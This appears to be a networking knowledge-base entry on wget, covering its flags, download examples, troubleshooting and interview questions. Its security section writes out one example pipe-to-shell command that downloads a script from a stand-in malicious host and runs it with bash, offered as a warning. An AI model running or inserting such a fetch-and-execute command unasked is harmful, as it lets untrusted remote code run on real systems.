# wget

> wget is a command-line utility for non-interactive network downloads, designed to robustly retrieve files and entire websites from HTTP, HTTPS, and FTP servers.

## Overview
While `curl` is the versatile API testing knife, **wget** (Web Get) is the pure file-downloading bulldozer. Its primary purpose is to fetch files from remote servers and save them to disk. It is designed to be robust, resumable, and scriptable. 

`wget` is heavily used in Linux administration for downloading software packages, grabbing backups from internal servers, or mirroring entire static websites for offline viewing.

## Why It Matters
On a headless Linux server, there is no web browser to download software updates. `wget` is the standard. Because it can automatically retry interrupted connections and resume downloads, it is ideal for automation scripts and unstable WAN links. For pentesters, it is often the first tool used to quietly pull down exploit binaries or transfer data off a target server.

## Core Concepts
- **Non-Interactive:** `wget` is designed to run unattended inside cron jobs and shell scripts. It doesn't expect a user to sit and click buttons.
- **Resuming:** The `-c` (continue) flag allows `wget` to restart a partial download from where it left off if the network connection drops.
- **Recursion:** `wget` can recursively follow links on a website and download all the connected HTML, CSS, and image files, creating a full local mirror of the site.
- **Output to File:** Unlike `curl`, which prints the body to the terminal by default, `wget` saves the content directly to a file automatically.

## How It Works
1. You run `wget https://example.com/file.iso`.
2. `wget` resolves the domain, establishes the TCP/TLS connection, and performs a standard HTTP GET request.
3. It receives the HTTP response headers. Instead of printing the response body to the terminal, it opens a file on disk named `file.iso`.
4. As the data streams in, it writes it directly to the file, displaying a progress bar, transfer speed, and estimated time remaining.

## Components / Types
Important command line flags:
- `-O`: Save the downloaded file with a different, custom output filename.
- `-c`: Continue / Resume a partial download.
- `-r`: Recursive download (mirror a website).
- `--spider`: Don't download the file; just check if the remote URL exists and is reachable (useful for scripting).
- `-q`: Quiet mode. Suppresses almost all output, useful for cron jobs.
- `--user` and `--password`: Provide credentials for basic-authenticated web or FTP resources.

## Practical Examples
- **Software Installation:** An admin needs to install a package from GitHub on a remote Linux server. They use `wget` to download the `.rpm` or `.deb` package directly to `/tmp` before installing it.
- **Website Backup:** A security researcher uses `wget -r` to download a copy of a static website for offline analysis of its JavaScript files and API calls.

## Security Considerations
- **Execution Risk:** The standard attack path on Linux is to use `wget` or `curl` to download a shell script from the internet and pipe it directly to `bash` (e.g., `wget -O - http://malicious.com/installer.sh | bash`). This is a catastrophic security risk if the source is untrusted.
- **Credential Exposure:** Using `--user` and `--password` puts credentials directly into your shell history and process list (`ps aux`), exposing them to other users on multi-user servers.
- **File Integrity:** `wget` happily downloads any file. Engineers must manually verify the downloaded file's SHA256 hash using `sha256sum` to ensure the file wasn't tampered with during transit or compromised on the remote server.

## Commands / Configuration Examples
### Linux / macOS
```bash
# Basic download
wget https://example.com/software.tar.gz

# Resume an interrupted large file download
wget -c https://example.com/bigfile.iso

# Save the file with a different output name
wget -O latest_build.tar.gz https://ci.example.com/artifacts/build_12345.tar.gz

# Check if a URL is reachable without actually downloading the file
wget --spider https://example.com/file.txt
```

## Troubleshooting
- **Permission Denied:** If `wget` fails with "Permission denied," you are trying to save the file into a directory the current user cannot write to (e.g., `/root/`).
- **Download Resets:** If a large 10GB download repeatedly stalls and resets at the 1GB mark, the web server or proxy might have an internal connection timeout. The `-c` resume flag is mandatory.
- **404 Not Found:** The URL is incorrect, or the file has been deleted from the remote server.

## Interview Questions
- What is the primary difference in default behavior between `wget` and `curl`? (Answer: `wget` saves the content to a file by default; `curl` prints the content to the terminal by default).
- What flag allows `wget` to resume a partial download? (Answer: `-c`).
- Why is piping `wget` output directly into a shell (`wget -O - ... | sh`) considered a security anti-pattern?
- How can you verify a URL exists without downloading the content? (Answer: `wget --spider <url>`).

## Summary
`wget` is the standard, resilient download utility for Unix systems. By focusing on robust file retrieval, resumption, and automation, it serves as the backbone for package management, artifact delivery, and scripted data transfers on headless servers.

## References
- [curl](curl.md)
- [HTTP](../06-network-protocols/http.md)
- [HTTPS](../06-network-protocols/https.md)
- [Integrity Checking](../09-network-security/cia-in-networking.md)
